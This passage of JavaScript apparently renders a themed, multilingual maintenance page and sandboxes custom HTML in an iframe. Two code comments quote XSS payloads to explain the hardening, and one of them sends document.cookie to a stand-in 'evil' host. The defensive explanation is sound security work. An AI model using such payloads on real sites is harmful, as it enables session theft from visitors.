      '<div class="m-orb" style="width:250px;height:250px;background:'+esc(accent)+';opacity:.06;bottom:10%;right:10%;animation:maint-float 8s ease-in-out infinite reverse"></div>' +
      '</div>';
  }

  function wrapGradient(data, content, textColor, accent) {
    return '<div class="m-root" style="background:linear-gradient(-45deg,'+esc(accent)+','+esc(accent)+'88,#667eea,#764ba2,'+esc(accent)+');background-size:400% 400%;animation:maint-gradient-shift 15s ease infinite;color:'+esc(textColor)+'">' +
      '<div class="m-content">'+content+'</div></div>';
  }

  function wrapSplit(data, content, bg, textColor, accent, overlayOpacity) {
    var imgUrl = data.splitImageUrl || data.backgroundImageUrl;
    var imgPart = imgUrl
      ? '<div class="m-split-image" style="background-image:url(&quot;'+esc(cssUrl(imgUrl))+'&quot;)">' +
        '<div class="m-split-image-overlay" style="background:linear-gradient(135deg,'+esc(accent)+'33,transparent)"></div></div>'
      : '';
    return '<div class="m-split" style="color:'+esc(textColor)+'">' +
      '<div class="m-split-content" style="background:'+esc(bg)+'">' +
      '<div class="m-content">'+content+'</div></div>' +
      imgPart + '</div>';
  }

  function wrapVideo(data, content, bg, textColor, accent, overlayOpacity) {
    var video = data.videoUrl
      ? '<video autoplay loop muted playsinline class="m-video"><source src="'+esc(safeUrl(data.videoUrl))+'" type="video/mp4"></video>'
      : '';
    return '<div class="m-root" style="color:'+esc(textColor)+'">' +
      video +
      '<div class="m-overlay" style="background:'+esc(bg)+';opacity:'+overlayOpacity+';z-index:1"></div>' +
      '<div class="m-content" style="z-index:2">'+content+'</div></div>';
  }

  // ─── Aurora wrapper ───
  function wrapAurora(data, content, textColor, accent) {
    return '<div class="m-root" style="background:#0a0e27;color:'+esc(textColor)+';overflow:hidden">' +
      // Aurora layers
      '<div style="position:absolute;inset:0;overflow:hidden;z-index:0">' +
        '<div style="position:absolute;bottom:0;left:-30%;width:160%;height:60%;background:linear-gradient(180deg,transparent,'+esc(accent)+'33,#2dd4bf44,#a78bfa55,transparent);filter:blur(60px);animation:aurora-shift1 8s ease-in-out infinite;will-change:transform;opacity:.8"></div>' +
        '<div style="position:absolute;bottom:5%;left:-20%;width:140%;height:50%;background:linear-gradient(180deg,transparent,#a78bfa44,#f472b644,'+esc(accent)+'33,transparent);filter:blur(70px);animation:aurora-shift2 12s ease-in-out infinite;will-change:transform;opacity:.6"></div>' +
        '<div style="position:absolute;bottom:10%;left:-10%;width:120%;height:40%;background:linear-gradient(180deg,transparent,#2dd4bf55,'+esc(accent)+'44,#818cf844,transparent);filter:blur(50px);animation:aurora-shift3 10s ease-in-out infinite;will-change:transform;opacity:.7"></div>' +
        '<div style="position:absolute;inset:0;animation:aurora-glow 6s ease-in-out infinite;background:radial-gradient(ellipse at 50% 80%,'+esc(accent)+'15,transparent 70%)"></div>' +
      '</div>' +
      // Floating particles (CSS pseudo-element approach via inline)
      '<div style="position:absolute;inset:0;z-index:0;overflow:hidden">' +
        Array.from({length:12}, function(_,i) {
          var size = 2 + Math.random() * 3;
          var left = Math.random() * 100;
          var delay = Math.random() * 8;
          var dur = 6 + Math.random() * 6;
          return '<div style="position:absolute;width:'+size+'px;height:'+size+'px;background:'+esc(accent)+';border-radius:50%;left:'+left+'%;bottom:-10px;opacity:.6;animation:aurora-particle '+dur+'s '+delay+'s linear infinite;filter:blur(1px)"></div>';
        }).join('') +
      '</div>' +
      // Bottom waves (SVG)
      '<svg style="position:absolute;bottom:0;left:0;width:100%;height:120px;z-index:0;opacity:.3" viewBox="0 0 1200 400" preserveAspectRatio="none">' +
        '<path fill="'+esc(accent)+'22" style="animation:aurora-wave 8s ease-in-out infinite">' +
          '<animate attributeName="d" dur="8s" repeatCount="indefinite" values="M0,300 C200,280 400,320 600,290 C800,260 1000,310 1200,300 L1200,400 L0,400 Z;M0,310 C200,330 400,270 600,310 C800,290 1000,330 1200,290 L1200,400 L0,400 Z;M0,300 C200,280 400,320 600,290 C800,260 1000,310 1200,300 L1200,400 L0,400 Z"/></path>' +
      '</svg>' +
      // Stars
      '<div style="position:absolute;inset:0;z-index:0;background:radial-gradient(1px 1px at 10% 20%,rgba(255,255,255,.4),transparent),radial-gradient(1px 1px at 30% 60%,rgba(255,255,255,.3),transparent),radial-gradient(1px 1px at 50% 10%,rgba(255,255,255,.5),transparent),radial-gradient(1px 1px at 70% 40%,rgba(255,255,255,.3),transparent),radial-gradient(1px 1px at 90% 70%,rgba(255,255,255,.4),transparent),radial-gradient(1.5px 1.5px at 15% 80%,rgba(255,255,255,.2),transparent),radial-gradient(1.5px 1.5px at 85% 15%,rgba(255,255,255,.3),transparent)"></div>' +
      // Glass content card
      '<div class="m-glass-card" style="background:rgba(10,14,39,.45);border:1px solid rgba(255,255,255,.1);backdrop-filter:blur(24px) saturate(1.4);box-shadow:0 24px 80px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.08)">'+content+'</div>' +
    '</div>';
  }

  // ─── Neon wrapper ───
  function wrapNeon(data, content, textColor, accent) {
    var neonC1 = accent;
    var neonC2 = accent;
    // Determine complementary neon color
    if (accent.toLowerCase() === '#ff00ff' || accent.toLowerCase() === '#ff00ff') {
      neonC2 = '#00ffff';
    } else if (accent.toLowerCase() === '#00ffff') {
      neonC2 = '#ff00ff';
    } else {
      neonC2 = accent;
    }
    return '<div class="m-root" style="background:#0a0a0a;color:'+esc(textColor)+';overflow:hidden;--neon-c1:'+esc(neonC1)+';--neon-c2:'+esc(neonC2)+'">' +
      // Grid background
      '<div class="m-neon-grid"></div>' +
      // Scanning line
      '<div class="m-neon-scanline" style="background:linear-gradient(90deg,transparent,'+esc(accent)+',transparent)"></div>' +
      // Corner brackets
      '<div class="m-neon-corner m-neon-corner--tl" style="border-color:'+esc(accent)+'"></div>' +
      '<div class="m-neon-corner m-neon-corner--tr" style="border-color:'+esc(accent)+';animation-delay:.5s"></div>' +
      '<div class="m-neon-corner m-neon-corner--bl" style="border-color:'+esc(accent)+';animation-delay:1s"></div>' +
      '<div class="m-neon-corner m-neon-corner--br" style="border-color:'+esc(accent)+';animation-delay:1.5s"></div>' +
      // Glow orbs
      '<div style="position:absolute;width:400px;height:400px;border-radius:50%;background:'+esc(accent)+';filter:blur(150px);opacity:.07;top:-100px;right:-100px;z-index:0"></div>' +
      '<div style="position:absolute;width:300px;height:300px;border-radius:50%;background:'+esc(neonC2)+';filter:blur(120px);opacity:.05;bottom:-80px;left:-60px;z-index:0"></div>' +
      // Content card with neon border
      '<div style="position:relative;z-index:1;max-width:600px;width:90%;padding:3rem 2.5rem;border-radius:1rem;background:rgba(10,10,10,.8);border:1px solid '+esc(accent)+'44;animation:neon-box-pulse 3s ease-in-out infinite;backdrop-filter:blur(12px);display:flex;flex-direction:column;align-items:center;text-align:center">'+content+'</div>' +
    '</div>';
  }

  // ─── Mesh wrapper ───
  function wrapMesh(data, content, bg, textColor, accent) {
    // Generate mesh blobs with oklch-inspired colors derived from accent
    return '<div class="m-root" style="background:'+esc(bg)+';color:'+esc(textColor)+';overflow:hidden">' +
      '<div style="position:absolute;inset:0;z-index:0">' +
        '<div class="m-mesh-blob" style="width:45vmax;height:45vmax;background:'+esc(accent)+';top:-10%;left:-10%;animation:mesh-blob1 20s ease-in-out infinite"></div>' +
        '<div class="m-mesh-blob" style="width:40vmax;height:40vmax;background:linear-gradient(135deg,'+esc(accent)+'cc,#a78bfa);top:20%;right:-15%;animation:mesh-blob2 25s ease-in-out infinite"></div>' +
        '<div class="m-mesh-blob" style="width:35vmax;height:35vmax;background:linear-gradient(225deg,#f472b6,'+esc(accent)+'aa);bottom:-10%;left:20%;animation:mesh-blob3 22s ease-in-out infinite"></div>' +
        '<div class="m-mesh-blob" style="width:25vmax;height:25vmax;background:linear-gradient(45deg,#2dd4bf,'+esc(accent)+');bottom:20%;right:20%;animation:mesh-blob4 30s ease-in-out infinite;opacity:.5"></div>' +
      '</div>' +
      // Noise overlay for texture
      '<div style="position:absolute;inset:0;z-index:0;opacity:.03;background-image:url('+  "'" + 'data:image/svg+xml,<svg viewBox=\\"0 0 256 256\\" xmlns=\\"http://www.w3.org/2000/svg\\"><filter id=\\"n\\"><feTurbulence type=\\"fractalNoise\\" baseFrequency=\\"0.9\\"/></filter><rect width=\\"100%25\\" height=\\"100%25\\" filter=\\"url(%23n)\\"/></svg>' + "'" + ')"></div>' +
      // Content floating above mesh
      '<div class="m-content" style="z-index:1;backdrop-filter:blur(1px)">'+content+'</div>' +
    '</div>';
  }

  // ─── Particles wrapper ───
  function wrapParticles(data, content, bg, textColor, accent) {
    return '<div class="m-root" style="background:'+esc(bg)+';color:'+esc(textColor)+'">' +
      '<canvas id="m-particles" class="m-particles-canvas"></canvas>' +
      '<div class="m-content" style="z-index:1">'+content+'</div>' +
    '</div>';
  }

  // Particle system initializer (called after render)
  function initParticles(accent) {
    var canvas = document.getElementById('m-particles');
    if (!canvas) return;
    var ctx = canvas.getContext('2d');
    if (!ctx) return;

    var dpr = window.devicePixelRatio || 1;
    var mouse = { x: -9999, y: -9999 };
    var particles = [];
    var maxParticles = Math.min(120, Math.floor((window.innerWidth * window.innerHeight) / 8000));
    var connectDist = 150;

    function resize() {
      canvas.width = window.innerWidth * dpr;
      canvas.height = window.innerHeight * dpr;
      canvas.style.width = window.innerWidth + 'px';
      canvas.style.height = window.innerHeight + 'px';
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    }
    resize();
    window.addEventListener('resize', resize);

    // Parse accent to rgb
    function hexToRgb(hex) {
      var r = parseInt(hex.slice(1,3),16) || 100;
      var g = parseInt(hex.slice(3,5),16) || 150;
      var b = parseInt(hex.slice(5,7),16) || 255;
      return [r,g,b];
    }
    var rgb = hexToRgb(accent);

    // Create particles
    for (var i = 0; i < maxParticles; i++) {
      particles.push({
        x: Math.random() * window.innerWidth,
        y: Math.random() * window.innerHeight,
        vx: (Math.random() - 0.5) * 0.8,
        vy: (Math.random() - 0.5) * 0.8,
        size: 1.5 + Math.random() * 2
      });
    }

    // Mouse tracking
    document.addEventListener('mousemove', function(e) {
      mouse.x = e.clientX;
      mouse.y = e.clientY;
    });
    document.addEventListener('mouseleave', function() {
      mouse.x = -9999;
      mouse.y = -9999;
    });

    function animate() {
      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);

      for (var i = 0; i < particles.length; i++) {
        var p = particles[i];

        // Mouse interaction (soft repulsion)
        var dx = p.x - mouse.x;
        var dy = p.y - mouse.y;
        var dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 120 && dist > 0) {
          var force = (120 - dist) / 120 * 0.03;
          p.vx += (dx / dist) * force;
          p.vy += (dy / dist) * force;
        }

        // Update position
        p.x += p.vx;
        p.y += p.vy;

        // Damping
        p.vx *= 0.998;
        p.vy *= 0.998;

        // Wrap edges
        if (p.x < 0) p.x = window.innerWidth;
        if (p.x > window.innerWidth) p.x = 0;
        if (p.y < 0) p.y = window.innerHeight;
        if (p.y > window.innerHeight) p.y = 0;

        // Draw particle with glow
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba('+rgb[0]+','+rgb[1]+','+rgb[2]+',0.8)';
        ctx.shadowBlur = 12;
        ctx.shadowColor = 'rgba('+rgb[0]+','+rgb[1]+','+rgb[2]+',0.5)';
        ctx.fill();
        ctx.shadowBlur = 0;

        // Connect nearby particles
        for (var j = i + 1; j < particles.length; j++) {
          var p2 = particles[j];
          var ddx = p.x - p2.x;
          var ddy = p.y - p2.y;
          var d = ddx * ddx + ddy * ddy;
          if (d < connectDist * connectDist) {
            var alpha = 1 - Math.sqrt(d) / connectDist;
            ctx.beginPath();
            ctx.moveTo(p.x, p.y);
            ctx.lineTo(p2.x, p2.y);
            ctx.strokeStyle = 'rgba('+rgb[0]+','+rgb[1]+','+rgb[2]+','+(alpha * 0.25)+')';
            ctx.lineWidth = 0.6;
            ctx.stroke();
          }
        }
      }

      requestAnimationFrame(animate);
    }
    animate();
  }

  // ─── Render ───
  function render(data) {
    var dark = isDarkMode(data.darkMode || 'dark');
    var rawBg = col(data.backgroundColor, '#0f172a');
    var rawText = col(data.textColor, '#f8fafc');
    var bg = dark ? rawBg : (data.darkMode === 'auto' ? '#ffffff' : rawBg);
    var textColor = dark ? rawText : (data.darkMode === 'auto' ? '#1e293b' : rawText);
    var accent = col(data.accentColor, '#3b82f6');
    var overlayOpacity = (data.backgroundOverlayOpacity != null ? data.backgroundOverlayOpacity : 70) / 100;

    var msgs = data.messages || [];
    currentLang = detectLanguage(msgs);
    var msg = msgs.find(function(m){ return m.language === currentLang; }) || msgs[0];
    var cd = data.estimatedEnd ? getCountdown(data.estimatedEnd) : { days:0,hours:0,minutes:0,seconds:0,expired:true };
    var glass = data.template === 'glassmorphism';

    var contentHTML = buildContent(data, msg, cd, accent, textColor, glass);
    var page = '';

    switch (data.template) {
      case 'glassmorphism':
        page = wrapGlass(data, contentHTML, bg, textColor, accent, overlayOpacity); break;
      case 'gradient':
        page = wrapGradient(data, contentHTML, textColor, accent); break;
      case 'split-screen':
        page = wrapSplit(data, contentHTML, bg, textColor, accent, overlayOpacity); break;
      case 'video-background':
        page = wrapVideo(data, contentHTML, bg, textColor, accent, overlayOpacity); break;
      case 'aurora':
        page = wrapAurora(data, contentHTML, textColor, accent); break;
      case 'neon':
        page = wrapNeon(data, contentHTML, textColor, accent); break;
      case 'mesh':
        page = wrapMesh(data, contentHTML, bg, textColor, accent); break;
      case 'particles':
        page = wrapParticles(data, contentHTML, bg, textColor, accent); break;
      default:
        page = wrapDefault(data, contentHTML, bg, textColor, accent, overlayOpacity);
    }

    // Extra elements
    var extras = '';

    // Google font
    if (data.googleFont) {
      var fontUrl = 'https://fonts.googleapis.com/css2?family=' + encodeURIComponent(data.googleFont) + ':wght@400;600;700;800&display=swap';
      extras += '<link rel="stylesheet" href="'+fontUrl+'">';
      document.body.style.fontFamily = '"'+String(data.googleFont).replace(/[^\\w \\-]/g, '')+'", system-ui, -apple-system, sans-serif';
    }

    // Lottie script
    if (data.lottieUrl) {
      extras += '<script src="https://unpkg.com/@dotlottie/player-component@2/dist/dotlottie-player.mjs" type="module"><\\/script>';
    }

    // Progress bar
    if (data.showProgressBar) {
      extras += '<div class="m-progress-bar"><div class="m-progress-inner" style="background:linear-gradient(90deg,transparent,'+esc(accent)+',transparent)"></div></div>';
    }

    // Language switcher
    var langs = msgs.map(function(m){ return m.language; });
    if (langs.length > 1) {
      var sw = '<div class="m-lang-switcher">';
      langs.forEach(function(l) {
        var active = l === currentLang;
        sw += '<button class="m-lang-btn" data-lang="'+esc(l)+'" style="' +
          'border:'+(active ? '2px solid '+accent : '1px solid rgba(255,255,255,.15)') +';'+
          'background:'+(active ? accent : 'rgba(0,0,0,.4)') +';'+
          'color:'+esc(textColor)+';font-weight:'+(active ? '700' : '400')+'">'+esc(l)+'</button>';
      });
      sw += '</div>';
      extras += sw;
    }

    // Favicon
    if (data.faviconUrl) {
      var existing = document.querySelector('link[rel="icon"]');
      var faviconHref = safeUrl(data.faviconUrl);
      if (faviconHref) {
        if (existing) existing.setAttribute('href', faviconHref);
        else {
          var link = document.createElement('link');
          link.rel = 'icon';
          link.href = faviconHref;
          document.head.appendChild(link);
        }
      }
    }

    // Custom CSS is applied through a real <style> node: concatenating it into
    // the innerHTML string let a '</style><img src=x onerror=...>' payload
    // escape the stylesheet and execute.
    if (data.customCSS) {
      var customStyle = document.getElementById('m-custom-css');
      if (!customStyle) {
        customStyle = document.createElement('style');
        customStyle.id = 'm-custom-css';
        document.head.appendChild(customStyle);
      }
      customStyle.textContent = data.customCSS;
    }

    // Set page title
    if (msg && msg.title) document.title = msg.title;

    // Render
    document.getElementById('app').innerHTML = extras + page;

    // Set body background to match
    document.body.style.background = bg;
    document.body.style.color = textColor;

    // ─── Event bindings ───

    // Language switcher
    var langBtns = document.querySelectorAll('.m-lang-btn');
    langBtns.forEach(function(btn) {
      btn.addEventListener('click', function() {
        currentLang = this.getAttribute('data-lang');
        render(data);
      });
    });

    // Newsletter form
    var nlForm = document.getElementById('m-nl-form');
    if (nlForm) {
      nlForm.addEventListener('submit', function(e) {
        e.preventDefault();
        var emailInput = document.getElementById('m-nl-email');
        var email = emailInput ? emailInput.value : '';
        if (!email) return;
        var btn = nlForm.querySelector('button');
        if (btn) { btn.disabled = true; btn.textContent = '...'; }
        fetch(NEWSLETTER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: email, language: currentLang, consent: true })
        }).then(function(r) {
          if (r.ok) {
            nlForm.parentElement.innerHTML = '<div class="m-newsletter-success"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="'+accent+'" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg><span style="color:'+accent+'">'+t(currentLang,'newsletterSuccess')+'</span></div>';
          } else {
            if (btn) { btn.disabled = false; btn.textContent = data.newsletterButtonLabel || 'Me notifier'; }
            alert(t(currentLang, 'newsletterError'));
          }
        }).catch(function() {
          if (btn) { btn.disabled = false; btn.textContent = data.newsletterButtonLabel || 'Me notifier'; }
          alert(t(currentLang, 'newsletterError'));
        });
      });
    }

    // Countdown auto-update
    if (countdownInterval) clearInterval(countdownInterval);
    if (data.estimatedEnd && ['countdown','coming-soon','glassmorphism','gradient','aurora','neon','mesh','particles'].indexOf(data.template) !== -1) {
      countdownInterval = setInterval(function() {
        var newCd = getCountdown(data.estimatedEnd);
        var el = document.getElementById('m-countdown');
        if (!el) return;
        if (newCd.expired) { clearInterval(countdownInterval); location.reload(); return; }
        // Update values in place
        if (data.template === 'countdown') {
          // Rings — update text + strokeDashoffset
          var rings = el.querySelectorAll('.m-ring-wrap');
          var vals = [newCd.days, newCd.hours, newCd.minutes, newCd.seconds];
          var maxes = [365, 24, 60, 60];
          rings.forEach(function(ring, i) {
            var txt = ring.querySelector('text');
            if (txt) txt.textContent = pad(vals[i]);
            var circle = ring.querySelectorAll('circle')[1];
            if (circle) {
              var r = 40, c = 2 * Math.PI * r;
              circle.setAttribute('stroke-dashoffset', String(((maxes[i] - vals[i]) / maxes[i]) * c));
            }
          });
        } else {
          // Flip — update values
          var flips = el.querySelectorAll('.m-flip-val');
          var vals2 = [newCd.days, newCd.hours, newCd.minutes, newCd.seconds];
          flips.forEach(function(f, i) { f.textContent = pad(vals2[i]); });
        }
      }, 1000);
    }

    // Neon: add neon-pulse animation to title
    if (data.template === 'neon') {
      var neonTitle = document.querySelector('.m-title');
      if (neonTitle) {
        neonTitle.classList.add('m-neon-title');
        neonTitle.style.animation = 'neon-pulse 2s ease-in-out infinite';
        neonTitle.style.webkitTextFillColor = '';
        neonTitle.style.backgroundClip = '';
        neonTitle.style.webkitBackgroundClip = '';
        neonTitle.style.background = 'none';
        neonTitle.style.color = accent;
      }
    }

    // Particles: initialize canvas particle system
    if (data.template === 'particles') {
      initParticles(accent);
    }
  }

  // ─── Track page view ───
  fetch(TRACK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ path: location.pathname })
  }).catch(function(){});

  // ─── Fetch status and render ───
  fetch(STATUS_URL)
    .then(function(r){
      // /status now answers 503 when it cannot read the global; fall through to
      // the catch below so the visitor gets the safe maintenance fallback
      // instead of a page rendered from an error payload.
      if (!r.ok) throw new Error('status ' + r.status);
      return r.json();
    })
    .then(function(data) {
      // Custom HTML template.
      // The markup comes from an editor account (the host can widen who edits
      // the global through 'adminAccess'), so it is NEVER assigned to the
      // page's own innerHTML: '<svg/onload=fetch('//evil/?c='+document.cookie)>'
      // would then run on this origin, in front of every visitor and of the
      // admin previewing /maintenance. It is rendered inside a sandboxed
      // iframe: no script execution, no access to this document, no cookies.
      if (data.template === 'custom' && data.customHTML) {
        var msgs = data.messages || [];
        currentLang = detectLanguage(msgs);
        var msg = msgs.find(function(m){ return m.language === currentLang; }) || msgs[0];
        var html = data.customHTML
          .replace(/\\{\\{title\\}\\}/g, esc((msg && msg.title) || ''))
          .replace(/\\{\\{description\\}\\}/g, esc((msg && msg.description) || ''))
          .replace(/\\{\\{estimatedEnd\\}\\}/g, esc(data.estimatedEnd ? formatDate(data.estimatedEnd, currentLang) : ''))
          .replace(/\\{\\{logoUrl\\}\\}/g, esc(safeUrl(data.logoUrl)));
        var doc = '<!DOCTYPE html><html><head><meta charset="utf-8">' +
          '<meta name="viewport" content="width=device-width,initial-scale=1">' +
          '<style>html,body{margin:0;padding:0;min-height:100%}</style>' +
          (data.customCSS ? '<style>' + String(data.customCSS).replace(/<\\/(?=style)/gi, '<\\\\/') + '</style>' : '') +
          '</head><body>' + html + '</body></html>';
        var frame = document.createElement('iframe');
        frame.setAttribute('sandbox', '');
        frame.setAttribute('title', 'Maintenance');
        frame.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:0';
        frame.srcdoc = doc;
        var app = document.getElementById('app');
        app.innerHTML = '';
        app.appendChild(frame);
        return;
      }
      render(data);
    })
    .catch(function() {
      render({
        enabled: true, template: 'minimal',
        messages: [{ language: 'fr', title: 'Site en maintenance', description: 'Nous revenons bientôt.' }]
      });
    });
})();
</script>
</body>
</html>`

    return new Response(html, {
      status: 503,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Retry-After': '3600',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'X-Robots-Tag': 'noindex',
      },
    })
  }
}
